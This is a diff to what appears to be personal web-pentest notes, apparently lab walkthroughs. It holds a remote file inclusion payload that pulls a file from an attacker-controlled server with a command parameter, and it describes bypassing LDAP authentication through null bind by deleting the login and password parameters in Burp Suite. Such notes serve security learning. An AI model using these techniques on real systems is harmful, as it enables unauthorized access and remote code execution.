@@ -160,3 +160,26 @@ In this case Our target is the same but the difference is that the end point is 
 say that its given by the server, so how to bypass it ?
 Its simple we can use the same old payload but we need to use a random parameter to it to be like this Target/?page=http://IPofmyServer/poc.txt?random=&c=cmd
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+									          LDAP
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Companies store usernames, passwords, email addresses, printer connections, and other static data within directories. LDAP is an open, vendor-neutral application protocol for accessing and maintaining that data. LDAP can also tackle authentication, so users can sign on just once and access many different files on the server.
+
+LDAP is a protocol, so it doesn't specify how directory programs work. Instead, it's a form of language that allows users to find the information they need very quickly.
+
+LDAP is vender-neutral, so it can be used with a variety of different directory programs. Typically, a directory contains data that is:
+
+Descriptive. Multiple points, such as name and location, come together to define an asset.
+Static. The information doesn’t change much, and when it does, the shifts are subtle.
+Valuable. Data stored within the directory is critical to core business functions, and it's touched over and over again.
+Sometimes, people use LDAP in concert with other systems throughout the workday. For example, your employees may use LDAP to connect with printers or verify passwords. Those employees may then switch to Google for email, which doesn't rely on LDAP at all.
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+									          LDAP [0]
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+In normal situations, to connect to an LDAP server, you will need to provide a username and a passowd
+However, some LDAP servers authorise NULL Bind:
+If null values are sent, the LDAP server will proceed to bind the connection
+As a result, the PHP code will think that the credentials are correct.
+So in our case is simple, to bypass LDAP Authentication you will need to drope the parametes login and pass, you can use burpsuite to intersept the request and delete the parames and you will be connected!
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+									          LDAP [soon]
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
